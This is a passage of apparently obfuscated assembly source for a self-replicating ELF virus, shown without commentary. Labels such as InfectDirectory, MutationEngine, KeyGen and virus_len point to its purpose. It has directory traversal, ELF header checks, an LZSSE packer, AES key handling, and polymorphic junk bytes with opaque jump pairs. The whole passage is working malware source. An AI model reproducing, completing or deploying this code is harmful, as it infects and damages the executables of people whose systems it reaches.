    jl          ..@qx6LZXOTOb7H
    jge         ..@qx6LZXOTOb7H
..@LdNdNcP81K6k:
    call        KeyGen
    jb          ..@tLfUCGE0LZqQ
    jae         ..@tLfUCGE0LZqQ
..@InqweSwsTToA:
    add         rsp, 0x100
    jmp         $+5
db 0x92, 0x7f, 0x22
    jmp         $+5
db 0x6f, 0x6a, 0xa5
    jb          ..@lVrNbHQt2Gqh
    jae         ..@lVrNbHQt2Gqh
..@UwN33NqZOCUG:
    rep         nop
    jmp         $+3
db 0xb5
    jmp         $+4
db 0x38, 0xbf
    jmp         $+5
db 0x47, 0x11, 0xe6
    jl          ..@7r1Kqjwq0Pgy
    jge         ..@7r1Kqjwq0Pgy
..@W69tWz8tFynq:
%ifdef X86_64
    pop         rsi
%endif
    jmp         ..@iqizEqI8AFAh
..@KxJtgK4zqY6E:
    xchg        rdi, rdi
    xchg        rsi, rsi
    mov         rsi, rsi
    jmp         $+4
db 0x5c, 0x33
    jl          ..@4PkcoYkWerCd
    jge         ..@4PkcoYkWerCd
..@H7ZXfaPc1MFk:
    ret
    jmp         $+4
db 0x48, 0x42
    jmp         DYNPIEValidation
..@h5GMdlKgvosa:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    jmp         ..@Vdr2IJNEIv8T
..@NotAFNw9t4kW:
    mov         rdi, rdi
    jl          ..@9hmYbkxp4VZM
    jge         ..@9hmYbkxp4VZM
..@7Zz4SpvqB74J:
    mov         rcx, rcx
    jmp         $+3
db 0x8a
    jmp         ..@eSMa1hDiA1cC
..@1QeUuPH4P3oX:
    mov         rax, [r5+file.filesize]
    jb          ..@sclNW5bcy6G0
    jae         ..@sclNW5bcy6G0
..@cdf7otiz6hR7:
%ifdef X86_64
    je          ..@22mKOCewfWK9
    mov         edx, DWORD [rdi]
    and         edx, 0fff8f8ffh
%endif
    jmp         ..@px4z6mYtK98G
..@zSbamrHaDhXY:
    ret
    jb          ..@dvLhxmtLjpWS
    jae         ..@dvLhxmtLjpWS
..@R2R1gcpaKQ1Q:
    ret
    jmp         KeyGen
..@q3klJmvdCxoz:
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
    jl          ..@amdq3pPU6wtm
    jge         ..@amdq3pPU6wtm
..@OWTgWfjHyzZ9:
    mov         rbx, 32
    push        rsi
    pop         rsi
    js          ..@0jSFrQrqpAtP
    jns         ..@0jSFrQrqpAtP
..@L4Ud7TM1Vvoy:
    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jmp         ..@tAdOnAZm4whu
..@JPH4E5RFkeA8:
    mov         rax, 1
    jmp         $+4
db 0xca, 0xb5
    js          ..@LkSL9DZSaqWm
    jns         ..@LkSL9DZSaqWm
..@hikxo8KBUiPL:
%ifdef X86_64
    push        rcx
%endif
    jmp         $+5
db 0xc7, 0xa1, 0xa9
    jmp         ..@BNkq8djVPgWH
..@0wLx4FHKMqrz:
    push        r5
    mov         rbx, rbx
    jmp         ..@PGZQbp9WRdF8
..@r2sYUl2aLIpo:
    push        rdi
    mov         rbp, rbp
    js          ..@igahxjapXHEX
    jns         ..@igahxjapXHEX
..@Zkec2xTDl9jg:
    mov         rdx, rdx
    add         rdi, rcx
    jmp         $+3
db 0x9b
    jb          ..@BIXpVXqsBnJq
    jae         ..@BIXpVXqsBnJq
..@ZduL6qpTYMGh:
    pop         r5
    jmp         ..@EYbBnEaLsUew
..@2jzMoLNu6P2H:
%ifdef X86_64
    jmp         ..@Y3LjlB3JNZ25
%endif
    jb          ..@75ohYMSoAkrM
    jae         ..@75ohYMSoAkrM
..@VouQZ7yCPWe2:
%ifdef X86_64
    and         edx, 0ffc0fffah
    cmp         edx, 90c08948h
%endif
    jmp         $+4
db 0x87, 0xa9
    je          ..@K3GFkfzzeovG
    jne         ..@K3GFkfzzeovG
..@BxQwZCDTmSQV:
    rep         nop
    jmp         ..@1HPuZf2RfwvK
..@5iqlaAUIGvO5:
    jl          ..@InqweSwsTToA
    je          ..@JTYZ4Robt4jk
    jl          ..@Yw9PJTnY77el
    jge         ..@Yw9PJTnY77el
..@cGP09nYXMB8D:
    mov         r1, QWORD [r5+file.fileptr]
    add         r1, signature_reg_len-1
    mov         BYTE [r1], 0x00
    jl          ..@TxyvKXBIQfy2
    jge         ..@TxyvKXBIQfy2
..@RzqBrMURwYiq:
    push        rsi
    jmp         $+3
db 0xe6
    je          ..@iFMtXObLRMMl
    jne         ..@iFMtXObLRMMl
..@9Vm1fR0OU85v:
    jmp         ..@9VxprLxMwhWQ
    je          ..@5anxMG9gLIfj
    jne         ..@5anxMG9gLIfj
..@1STlLRVgHTyt:
    cmp         BYTE [r5], DT_DIR
    push        rcx
    pop         rcx
    jl          ..@s5v51612WUmr
    jge         ..@s5v51612WUmr
..@QHdP0daYLnb0:
    mov         rbx, rbx
    jmp         ..@S0AyWdqutTJr
..@RxV6xAnNWj9n:
    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
    jmp         $+4
db 0xb5, 0x05
    je          ..@0fU7YmJtjli0
    jne         ..@0fU7YmJtjli0
..@D8I7702PHlA5:
    add         rdi, rcx
    jmp         ..@z5emNdr4TNFe
..@kCZ5fAeLbInZ:
    pop         rsi
    mov         rax, (-1)
    ret
    jmp         ConvertDoubleJumpToJump
..@K3GFkfzzeovG:
%ifdef X86_32
    and         edx, 0000c0ffh
    cmp         edx, 0c089h
%endif
    jmp         $+4
db 0xa5, 0x52
    jmp         ..@RO2YHGAn25Dc
..@iAGV4goFgChN:
    jmp         Strcpy
    xchg        rdi, rdi
    jmp         $+3
db 0x97
    jb          ..@IjVleKN9pNVo
    jae         ..@IjVleKN9pNVo
..@s8aLM0bkw4nO:
    inc         WORD m5
    jmp         $+3
db 0x92
    jb          ..@YxTJqzQcjJ4O
    jae         ..@YxTJqzQcjJ4O
..@KTLcHSCJ831I:
    jz          ..@QHdP0daYLnb0
    jmp         ..@N5wHDuh5SyNX
..@madFvqsBdEiZ:
%ifdef X86_64
    and         edx, 0fff8fff8h
    cmp         edx, 90584150h
%endif
    jmp         ..@cdf7otiz6hR7
..@VFuiZzD8MJQ3:
%ifndef ENABLE_DEBUGGING
    pop         rcx
    jz          ..@khwy1wAVKufM
%endif
    jmp         $+3
db 0x26
    jl          ..@cnif1qfbEMzD
    jge         ..@cnif1qfbEMzD
..@tWZN9wJfoBoe:
    cmp         dx, 800fh
    jmp         ..@7a9cFLB1DYRk
..@UsBwyiCpEYhP:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jmp         $+3
db 0x75
    jb          ..@p5nS9UPt9BhY
    jae         ..@p5nS9UPt9BhY
..@DrGlWbaQ1CG5:
    shr         edx, 8
    jmp         $+5
db 0x33, 0x96, 0xdc
    jb          ..@l46rPEDKBWow
    jae         ..@l46rPEDKBWow
..@YSknTayYLsTr:
    xor         r1, r1
    jmp         ..@rLmtcidUUtff
..@tgAt9uDDsfXT:
    push        rax
    pop         rax
    xor         rax, rax
    jmp         $+4
db 0x44, 0x96
    js          ..@oOISTh7ZUsEJ
    jns         ..@oOISTh7ZUsEJ
..@5HnUtzYUoTbG:
    mov         rcx, rcx
    jmp         $+5
db 0xc0, 0x10, 0xaa
    jl          ..@iRabguBenThU
    jge         ..@iRabguBenThU
..@xT3xIuweLs99:
    mov         QWORD m5, 0x01
    js          ..@RhoNJikEvJok
    jns         ..@RhoNJikEvJok
..@xLi1GPvGBv2V:
    sub         r2, 1
    cmp         r2, 0
    je          ..@buWmpYFpOQsU
    jmp         $+4
db 0x17, 0x3b
    jmp         ..@SGwb4iW12E0I
..@0pxzm6DyhUwO:
    mov         rdi, rdi
    jmp         $+4
db 0xd2, 0x72
    jb          ..@DBJbfG889Dnl
    jae         ..@DBJbfG889Dnl
..@CzIdzgTw6kX7:
    add         rcx, 0x10
    jmp         ..@6QDPiTvFlx1q
..@ybXXXP8KqDWK:
    mov         rax, (-1)
    jmp         $+3
db 0x0e
    jmp         ..@O6LHI18svdN1
..@kziuSOezBNPL:
    shl         edi, 0x8
    jmp         ..@sL0ElTAVQqNt
..@bNrX2sLSsm2Z:
    xor         rax, rax
    jmp         $+3
db 0xa3
    jmp         ..@PxiiEGXpbOMb
..@zKOO1sgTl70j:
%ifdef X86_64
    jmp         ..@XndGscxJaKlF
%endif
    jmp         $+4
db 0x03, 0x86
    jmp         ..@RyNUexJUqHmS
..@KiO856RHtM0Q:
    xor         r2, r2
    js          ..@OrUFRcF9bGkg
    jns         ..@OrUFRcF9bGkg
..@OlWfsvpou39D:
    jnz         ..@g09Y2ImfeQvY
    jmp         $+5
db 0x31, 0xac, 0x8a
    jmp         $+5
db 0x93, 0x78, 0x22
    je          ..@dLgHwDY6ADrn
    jne         ..@dLgHwDY6ADrn
..@ZqyqvYzWfipb:
    jnz         ..@amdq3pPU6wtm
    jmp         $+5
db 0x8f, 0x02, 0x4c
    jmp         $+3
db 0xa0
    jmp         ..@hqKWTgVG1Zh8
..@KOYp3MT05R0B:
    add         rdi, virus_len-_start
    mov         rsi, m7
    sub         rsi, m6
    jmp         ..@XS3sLXGfybk5
..@Kcx58GxoSvuT:
    sub         rcx, rax
    jmp         $+4
db 0x40, 0xb2
    jmp         $+4
db 0x72, 0xa9
    js          ..@3EFudJRlCvAQ
    jns         ..@3EFudJRlCvAQ
..@0HVr0wj7GkHQ:
    push        rcx
    pop         rcx
    jmp         $+4
db 0x34, 0xd4
    je          ..@UwN33NqZOCUG
    jne         ..@UwN33NqZOCUG
..@tZre7MAuDc3A:
    mov         ecx, DWORD [rdi+2]
    jl          ..@sC94sbm24Wqm
    jge         ..@sC94sbm24Wqm
..@sbHdnZjrEyDy:
    pop         rsi
    js          ..@1STlLRVgHTyt
    jns         ..@1STlLRVgHTyt
..@BPeppR8prriG:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jmp         ..@0Mpr65CtwYiZ
MemMove:
    jmp         ..@uWwzxfGZwwl6
..@J1r764fC38Kc:
    push        rax
    xchg        rsi, rsi
    jl          ..@VtAa4Ss83pkU
    jge         ..@VtAa4Ss83pkU
..@f8efa55tw663:
    mov         rax, 0xff
    jl          ..@nHeTQkmoBqcd
    jge         ..@nHeTQkmoBqcd
..@XKPavLuhXxcW:
%ifndef ENABLE_DEBUGGING
    sub         r2, 1
    cmp         r2b, 0x0
    jge         ..@nB3x1vdD7cYf
%endif
    jmp         $+5
db 0x71, 0xa1, 0x3d
    jmp         ..@qFjvpHbIehdK
..@smMPzgfPJiIo:
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    jmp         ..@YwQHSpD8fYRJ
..@Jt5gBrMDXdR9:
    xor         rax, rax
    jmp         $+4
db 0xc7, 0x13
    js          ..@qATh6llNfq3o
    jns         ..@qATh6llNfq3o
..@wkB5sDOWdk5f:
    test        al, al
    mov         rsp, rsp
    push        rbx
    jl          ..@PGNZGxkqYuIE
    jge         ..@PGNZGxkqYuIE
..@FiF583wZ9llx:
    mov         eax, ebx
    and         eax, edx
    jmp         ..@EdHxijHvPUyX
..@N42TmkDWhs6M:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jmp         $+3
db 0x15
    jmp         $+5
db 0x3a, 0xb5, 0x3c
    jmp         ..@sTncRpwqK9Aq
..@PWAKomQXpQuU:
    mov         rsi, rsi
    jl          ..@dWjI1GoznNOz
    jge         ..@dWjI1GoznNOz
..@nhfgGG0w6skm:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
%endif
    jmp         $+4
db 0x76, 0x9c
    jb          ..@RshzZFqVEHAM
    jae         ..@RshzZFqVEHAM
..@cHmWeqpF8Tyv:
%ifdef X86_64
    push        rbx
    pop         rbx
%endif
    jmp         $+5
db 0x86, 0x69, 0xdc
    js          ..@teZ6s371w5uR
    jns         ..@teZ6s371w5uR
..@xgKYMsnINfUd:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+3
db 0x14
    jb          ..@zJIF0qgAuTK8
    jae         ..@zJIF0qgAuTK8
..@CkoX6D7uIB5D:
    mov         rdi, rdi
    mov         eax, SYS_READ
    jmp         $+5
db 0xc9, 0x4a, 0xc3
    jmp         ..@KIWyA8M8aPFp
..@JXuQttGh2Gml:
    mov         bl, 31h
    jmp         ..@d2O33GeSKt6I
..@WH2kS6nsQPcJ:
    call        DYNPIEValidation
    jmp         $+4
db 0xc2, 0x2d
    je          ..@pUPLVq3153jW
    jne         ..@pUPLVq3153jW
..@vl47GkY3umI5:
    cmp         r2d, '../'
    jb          ..@y5ECWSD5gQiO
    jae         ..@y5ECWSD5gQiO
..@tqWgufzXbuVL:
    xchg        rsi, rsi
    js          GetNewProgramVaddr
    jns         GetNewProgramVaddr
..@JGhcOYqbX2Zn:
    push        r2
    push        r1
    mov         r5, QWORD [r1+file.fileptr]
    jmp         $+4
db 0xaa, 0x29
    je          ..@c5b6NYZTKCsp
    jne         ..@c5b6NYZTKCsp
..@Zwj8zqrBJjw9:
    pop         r1
    jmp         $+4
db 0x72, 0x1f
    jmp         $+5
db 0x13, 0xbe, 0xbb
    jmp         ..@nVRJYLh6LAtE
..@8vURFwhcJ3MN:
    xor         rax, rax
    mov         rdi, rdi
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+4
db 0xe4, 0xbb
    jb          ..@Kcx58GxoSvuT
    jae         ..@Kcx58GxoSvuT
..@pM1IXJvi1Cs4:
    mov         rax, 0x20
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    js          ..@489SSuZHEZaj
    jns         ..@489SSuZHEZaj
..@SaFUvXK02XDn:
    add         rdi, key-_start
    lea         rsi, [rsp+_PAYLOAD_OFF.key]
    jmp         $+3
db 0x7b
    jb          ..@uwHklWaSXOtP
    jae         ..@uwHklWaSXOtP
..@8VFwjCi1WtoD:
    mov         ebx, 90909090h
    jmp         $+4
db 0x57, 0xb4
    jmp         $+3
db 0xb1
    je          ..@nkItDkGMFTGy
    jne         ..@nkItDkGMFTGy
..@It7FaW8DJTZh:
    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         $+3
db 0x37
    jl          ..@BsKLGs3Xl8mJ
    jge         ..@BsKLGs3Xl8mJ
..@zJ2nJGnVw8nj:
    xchg        rdx, rdx
    rep         nop
    mov         rsp, rsp
    jb          ..@owEkiorSwDwb
    jae         ..@owEkiorSwDwb
..@fHIfNJSaPDvy:
    jmp         ..@7E4bycw6Qoqi
    jmp         $+4
db 0x18, 0x41
    jmp         ..@rpCZppoGOZPE
..@838IYLJ3xuEs:
    call        UnmapFile
    mov         r2, 11b
    jmp         $+4
db 0x6d, 0xdf
    jb          ..@Zm2TvjvIZl3A
    jae         ..@Zm2TvjvIZl3A
..@wwAMGrBRslwL:
%ifdef X86_32
    push        rcx
%endif
    jmp         $+3
db 0x13
    jmp         $+4
db 0x7f, 0x2a
    jmp         $+3
db 0x4c
    jmp         $+5
db 0xa5, 0xe8, 0x90
    jl          ..@Grx3d6opKINO
    jge         ..@Grx3d6opKINO
..@22mKOCewfWK9:
    xor         rsi, rsi
    xor         rax, rax
    jmp         $+4
db 0x54, 0x69
    je          ..@68LVBbtBcdT0
    jne         ..@68LVBbtBcdT0
..@rLmtcidUUtff:
    xor         r2, r2
    js          ..@BFDVbjy89gvc
    jns         ..@BFDVbjy89gvc
..@l46rPEDKBWow:
%ifdef X86_64
    xor         rcx, rcx
%endif
    jmp         $+4
db 0xd3, 0x01
    jl          ..@EKdGUuJFwP6L
    jge         ..@EKdGUuJFwP6L
..@S2inBMuMu9h1:
    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    sub         r1, r4
    jl          ..@l3AhRwXuumTB
    jge         ..@l3AhRwXuumTB
..@keQ6dWfZR5YI:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    add         rdi, _signature.index-_signature.start
    mov         DWORD [rdi], eax
    jmp         $+4
db 0x7e, 0x57
    jmp         $+3
db 0x46
    jb          ..@tWOsBJOQc6gz
    jae         ..@tWOsBJOQc6gz
MutationEngine:
    jmp         ..@X9r1F1j54Zc2
..@nuvAXNmWf4jf:
    cmovl       dx, ax
    jl          ..@uNqmqAsuezuJ
    jge         ..@uNqmqAsuezuJ
..@Uve1D81fvBW9:
    mov         rax, rax
    jmp         $+5
db 0x60, 0x65, 0x71
    jb          ..@GOvCHOilKDbc
    jae         ..@GOvCHOilKDbc
..@UBVZsJd2LSvA:
    push        rbx
    jb          ..@WxUbvXTOspK9
    jae         ..@WxUbvXTOspK9
..@80qeS6ZZU69k:
    syscall
    push        rcx
    pop         rcx
    jmp         $+3
db 0xc6
    je          ..@r3qX0Nech4Wy
    jne         ..@r3qX0Nech4Wy
..@XhSn868Idt4L:
    jmp         ..@2K19Yi4ljM8F
    jmp         $+3
db 0x3a
    jmp         ..@cle90Kde6jzn
..@D4puhv4aPdvZ:
    mov         dx, WORD [rdi+6]
    jb          ..@YDEMO30Td73q
    jae         ..@YDEMO30Td73q
..@Vpyhr0OR1Nhr:
    push        rbp
    js          ..@UwRkXAxXOXl8
    jns         ..@UwRkXAxXOXl8
..@WVkNRL02eBdX:
%ifdef X86_64
    jne         ..@J4Sjbxs73beZ
%endif
    jmp         ..@10Wu4Ee9SWX9
..@xXAhdgItxYKJ:
%ifdef X86_64
    test        dx, dx
    jz          ..@SLzDbYpGtJm7
    cmp         dx, 9000h
%endif
    jmp         $+4
db 0x33, 0xa0
    js          ..@NiQU6em0nHYb
    jns         ..@NiQU6em0nHYb
..@qQjfejxkgFqS:
    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
    js          ..@LVwGzfOdMUZ2
    jns         ..@LVwGzfOdMUZ2
..@q4ZjX6j4cbbt:
    mov         r1, QWORD [r5+file.filesize]
    cmp         r1, e_h_size
    rep         nop
    jmp         ..@A9RF9w2x0agW
..@9Xk5kGYkPNs5:
    add         r2, e_h.e_shoff
    push        rax
    pop         rax
    jmp         $+5
db 0xbb, 0x4f, 0x29
    jmp         ..@fM8Xhaby6N9k
..@gNJWoRZMHiUW:
    add         ecx, 4
    jmp         $+4
db 0x07, 0xa8
    jmp         ..@cENA9U7jA0VU
..@GWmDfMv9tB49:
    mov         r2, r1
    jmp         ..@9Xk5kGYkPNs5
..@4iHGd5DDpo4q:
    jnz         ..@FiF583wZ9llx
    jmp         $+3
db 0x3d
    jmp         ..@bRKiNCSKtyK4
..@ZCmTFeu3e8uO:
    xchg        rax, rax
    jmp         $+4
db 0x58, 0x4f
    jmp         ..@HGikMboLI6OP
..@UH9E8PB3PlLM:
    std
    rep         movsb
    cld
    jmp         $+5
db 0x31, 0x61, 0xf7
    jl          ..@gadVvkum1seV
    jge         ..@gadVvkum1seV
..@qANSYYncNqBS:
    jl          ..@xhnPlifgVHJv
    jmp         $+3
db 0x6e
    jb          ..@Af0D8oCrtF8C
    jae         ..@Af0D8oCrtF8C
..@bSzUzZa4KWmt:
    shr         edx, 3
    cmp         edx, ebx
    jmp         $+5
db 0xae, 0x44, 0xf3
    jmp         $+3
db 0x6e
    jl          ..@D9tPFqcOZ2tj
    jge         ..@D9tPFqcOZ2tj
..@dCsT2520TKXM:
    xchg        rcx, rcx
    call_vsp    Strlen
    jmp         $+4
db 0x0e, 0x74
    jmp         ..@GwlgQ00yLZiG
..@xJV85vYG1kiK:
    mov         DWORD [rdi+8], ecx
    jmp         ..@uXkQCGQfVkmO
    jmp         $+3
db 0xdb
    jmp         ..@Xnru4hfscH9K
..@BHj4UrFzrI9l:
    ret
    jmp         ..@tqWgufzXbuVL
..@AHrZzQ5jPpOh:
%ifdef X86_32
    xor         eax, eax
%endif
    jmp         ..@bPOAuJA2SJip
..@NgwRfZQP5krM:
    push        rcx
    mov         rdi, rsi
    jmp         $+3
db 0x55
    js          ..@Zkec2xTDl9jg
    jns         ..@Zkec2xTDl9jg
..@gF5PZ4AdfUcn:
    xchg        rcx, rcx
    jmp         $+3
db 0x92
    jl          ..@LYEyDRUtgZHF
    jge         ..@LYEyDRUtgZHF
..@JX59QGF5xMaT:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jmp         $+3
db 0x5e
    jmp         $+3
db 0x66
    jl          ..@lAuDzYAHNBDa
    jge         ..@lAuDzYAHNBDa
..@cUjpdpJ0Hgom:
    push        rdi
    jmp         $+3
db 0x34
    jl          ..@2TNN6RenQdK6
    jge         ..@2TNN6RenQdK6
..@DfjivHPpzAmd:
    mov         rdx, rdx
    pop         rax
    jmp         $+4
db 0xd1, 0x87
    jmp         ..@oXN93sDCRbZv
..@1HPuZf2RfwvK:
    xor         rdx, rdx
    xor         rax, rax
    mov         dl, BYTE [rsi]
    jmp         $+4
db 0x12, 0x40
    je          ..@1TDjoA5z7Tte
    jne         ..@1TDjoA5z7Tte
..@2XOovPlqWffx:
    mov         QWORD [r5+file.fileptr], rax
    js          ..@Xrcst0kynpCH
    jns         ..@Xrcst0kynpCH
..@OmRC0gXF7WJv:
    je          ..@WutBrwoVWeEb
    push        rsi
    jmp         $+3
db 0xee
    jmp         ..@mT5QdtqlTNMO
..@dVE23ZuLAw71:
    jz          ..@uaPRMwSpKrFC
    jmp         $+3
db 0x61
    jmp         $+3
db 0x78
    jmp         ..@wGh8e4qVzVvd
..@VHeWHt6mkIgg:
    add         rdi, _signature.key_preview-_signature.start+4
    mov         DWORD [rdi], eax
    xor         r1, r1
    jmp         $+3
db 0xd8
    jb          ..@0qVCOCZBFNbP
    jae         ..@0qVCOCZBFNbP
..@aa4JwCWVCI4i:
    ret
    jmp         ConvertJumpToDoubleJump
..@oLQwLvQp61SC:
%ifdef X86_32
    mov         BYTE [esi+ecx], 00h
%endif
    jmp         $+5
db 0xec, 0x7e, 0xd7
    jb          ..@QxxBlCj01cUW
    jae         ..@QxxBlCj01cUW
..@cISsTFf4Ut4J:
    ret
    js          ..@OWZQyHUDcRAj
    jns         ..@OWZQyHUDcRAj
..@WqnH6zy5bfzs:
    movr        rdi, rsp
    movv        rcx, 0x20
    movv        rax, 0x00
    jmp         $+3
db 0xb6
    jmp         ..@fOdaljOO5u9M
..@jhBEwTGVcUEu:
    pop         rsi
    jmp         ..@71c3hgOu7YKt
..@PNDsfRdj7XUT:
%ifdef X86_32
    int         0x80
    pop         ebp
    xchg        rcx, rcx
%endif
    je          ..@z6G85PkJB3dZ
    jne         ..@z6G85PkJB3dZ
..@i8HcJiDvnYdM:
%ifdef X86_64
    mov         edx, r10d
%endif
    jmp         $+5
db 0x8a, 0x15, 0x04
    jmp         ..@IotBDY8zvMxM
..@9Bd94AJe7Ozq:
    or          bl, cl
    shl         cl, 3
    jb          ..@qB14iNGfS3ub
    jae         ..@qB14iNGfS3ub
..@Lh9WHAeAKnCC:
    mov         DWORD [rdi+1], ecx
    mov         DWORD [rdi+5], 90909090h
    mov         WORD [rdi+9], 9090h
    jmp         $+3
db 0x61
    jl          ..@OyDTU3D8jyHm
    jge         ..@OyDTU3D8jyHm
..@63Jx53RFkBlL:
    mov         rdi, m6
    jmp         ..@ti8xBiKnC8wo
..@3LPX5WJ3Bn8h:
    mov         r1, r5
    jl          ..@HbdMUBMVVk0Y
    jge         ..@HbdMUBMVVk0Y
..@oKMY3uAJnNyC:
    push        rax
    jmp         $+4
db 0x7f, 0xd3
    jmp         ..@FRhkY4qFuJzb
..@CWSSXccIwlDY:
    push        rcx
    jmp         $+4
db 0xd0, 0x90
    jl          ..@dHXRfqRGujOk
    jge         ..@dHXRfqRGujOk
..@4PULVwcmz2Wa:
    shl         al, 3
    jmp         $+3
db 0x9c
    jmp         ..@zOf2xKaFNAjc
..@ZglqzhYUIKUk:
    push        r1
    jmp         $+5
db 0xf9, 0xa8, 0x41
    je          ..@9laUbrlgZINj
    jne         ..@9laUbrlgZINj
..@OXhbmrxo5AQ3:
%ifndef ENABLE_DEBUGGING
    mov         r2, rsp
    mov         r3d, 0x10
%endif
    jmp         $+3
db 0x10
    jl          ..@M8lFXCLBaPst
    jge         ..@M8lFXCLBaPst
..@yJ3IbXvRVsqD:
    pop         rcx
    jmp         $+5
db 0x9d, 0xc2, 0x25
    jmp         ..@J3h23JgIfuLY
..@tLfUCGE0LZqQ:
    mov         r5, QWORD [rsp+_NBF_OFF.file]
    xchg        rdx, rdx
    jmp         $+4
db 0xcf, 0xcd
    jmp         ..@fCj1D8YWltA8
..@CqKVdWh1UuSw:
    mov         edx, DWORD [rdi]
    xor         rbx, rbx
    mov         ebx, 90909090h
    jmp         $+3
db 0x2c
    js          ..@KemEgyOqoiLR
    jns         ..@KemEgyOqoiLR
..@EBiHMJGzySCF:
    push        rax
    jmp         ..@4OcDLE6ObNmO
..@4Wqhwfqi5gtV:
    pop         rcx
    jmp         $+4
db 0x77, 0xe6
    js          ..@qMkxvJZzFgQl
    jns         ..@qMkxvJZzFgQl
..@LlNUVQiJMpXB:
    mov         rcx, rcx
    jmp         $+5
db 0x85, 0x32, 0x4d
    jmp         ..@CjbE3RhOA3sg
..@L8BFsiOqV6d7:
    push        rdi
    pop         rdi
    jmp         ..@dkpRc0CGEAx2
..@sC94sbm24Wqm:
    add         ecx, 1
    xchg        rdx, rdx
    xchg        rcx, rcx
    je          ..@gikB2a9v9yZF
    jne         ..@gikB2a9v9yZF
..@M8TWLZVLajVn:
    mov         rdi, rdi
    pop         rsi
    jmp         ..@nJp8xEmarYFT
..@A9RF9w2x0agW:
    jge         ..@jSni2SEiqozn
    cmp         r1, 0x00
    jl          ..@gOaJxBC02Lpu
    jge         ..@gOaJxBC02Lpu
..@c27KibWHv9rM:
%ifdef X86_32
    je          ..@TlOOr11ZBt9S
%endif
    jmp         ..@A1SFTyeHxq1g
..@VONZZlattL7P:
%ifndef ENABLE_DEBUGGING
    cmp         al, 0x0
    jl          ..@eLAQFp4O4zCz
%endif
    js          ..@XSY8pQzyjZmC
    jns         ..@XSY8pQzyjZmC
..@Krd3I7DScwxQ:
    pop         rdi
    jmp         $+4
db 0x70, 0xee
    jmp         $+5
db 0x73, 0x54, 0x03
    jmp         ..@VEwh68rduqhv
..@L88FcPwMQL5Y:
    sub         rsp, _INFFILE_OFF_size
    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
    jmp         ..@4MzMVwacKY8S
..@Qb1U3mduio6O:
    mov         rbx, rbx
    jmp         ..@JhkRtZSpGDmp
..@gikB2a9v9yZF:
    mov         BYTE [rdi], 0e9h
    jmp         ..@Lh9WHAeAKnCC
..@biJ7Z9qkJEFA:
    xchg        rsi, rsi
    jb          ..@Qq6Bkz5JhMRE
    jae         ..@Qq6Bkz5JhMRE
..@fj9XVPcTSpdx:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+4
db 0xb6, 0xf8
    jl          ..@JX59QGF5xMaT
    jge         ..@JX59QGF5xMaT
..@VvJk88zCBRfo:
    mov         al, BYTE [rsp+_LZSSE_OFF.buffer+rbx]
    cmp         BYTE [rsp+_LZSSE_OFF.character], al
    jl          ..@Q3cyj4z3mdgS
    jge         ..@Q3cyj4z3mdgS
..@lVrNbHQt2Gqh:
    ret
    jmp         $+4
db 0xa6, 0x2e
    jmp         InfectDirectory
..@pCrOxAxkTW17:
    mov         rax, rax
    jl          ..@bdzb1W0O0L56
    jge         ..@bdzb1W0O0L56
..@2TNN6RenQdK6:
    pop         rdi
    jmp         $+5
db 0xdc, 0xc5, 0x7a
    jb          ..@yz9MvUTVxAIY
    jae         ..@yz9MvUTVxAIY
..@ji0l0YdqIzFH:
    mov         rbp, rbp
    call        KeyGen
    jmp         $+4
db 0x21, 0x90
    jl          ..@fseyZvl5p9MH
    jge         ..@fseyZvl5p9MH
..@zGv2sW3MMEnx:
    pop         rdi
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    cmp         bx, WORD [rsi+e_h.e_shnum]
    jmp         $+4
db 0xd1, 0x28
    jb          ..@IABMXIp1yh1o
    jae         ..@IABMXIp1yh1o
..@5VDFkOiWqrFs:
    mov         QWORD [rdi], rsi
    jmp         ..@h3oSuE45nny1
..@Qc5tVqddkYRw:
    mov         r2, m8
    mov         r3, original_virus_len-non_packed_len
    jb          ..@gsNLeDGj2KXt
    jae         ..@gsNLeDGj2KXt
..@Xrcst0kynpCH:
    xor         rax, rax
    push        rdi
    pop         rdi
    jmp         $+3
db 0x10
    jl          ..@kt8ivBDxhclc
    jge         ..@kt8ivBDxhclc
..@6zg5YMDAvG4C:
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mov         BYTE [rdi], al
    jmp         ..@JR2Dne0gGJBZ
..@pxcHiSubJANH:
    sub         ecx, 6
    mov         WORD [rdi+6], dx
    jl          ..@xJV85vYG1kiK
    jge         ..@xJV85vYG1kiK
..@3UKFPVfCJfJA:
    add         rdi, rax
    jb          ..@1lM0Ad4mpxqx
    jae         ..@1lM0Ad4mpxqx
..@fw2yjVkAc55i:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x30]
    aesenc      xmm0, xmm1
    jmp         $+4
db 0x9a, 0xbf
    je          ..@WK2tGdv0QNxg
    jne         ..@WK2tGdv0QNxg
..@8td6nhslHxPX:
    push        r1
    jmp         $+4
db 0x89, 0x9e
    jmp         $+4
db 0x78, 0x6b
    js          ..@4hymSJ9rfGSy
    jns         ..@4hymSJ9rfGSy
..@MIqwcm3uIQ8J:
%ifdef X86_64
    and         edx, 0ffc0fffah
    cmp         edx, 90c03148h
%endif
    jmp         ..@uLx3XsjYJaDf
..@Gk5NZcoMyVzb:
    aesenc      xmm0, xmm1
